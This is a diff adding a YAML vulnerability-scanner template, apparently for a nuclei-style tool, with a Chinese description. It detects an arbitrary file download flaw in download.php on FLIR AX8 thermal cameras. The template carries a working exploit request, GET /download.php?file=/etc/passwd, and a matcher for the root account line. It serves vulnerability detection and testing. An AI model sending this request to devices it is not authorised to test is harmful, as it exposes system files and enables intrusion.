@@ -1,0 +1,25 @@
+id: flir-ax8-download-read-file
+
+info:
+  name: FLIR-AX8 download.php 任意文件下载
+  author: zan8in
+  severity: high
+  description: |
+    FLIR AX8红外热像仪、可见光相机集成入一种结构小巧、经济实惠的架构中，为关键机电设备的无间断状态监控提供连续的温度监控报警。
+    FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞
+    app="FLIR-FLIR-AX8"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/%E8%8F%B2%E5%8A%9B%E5%B0%94/FLIR-AX8%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.html
+
+http:
+  - raw:
+      - |
+        GET /download.php?file=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200 && regex('root:.*:0', body_1)
+        condition: and
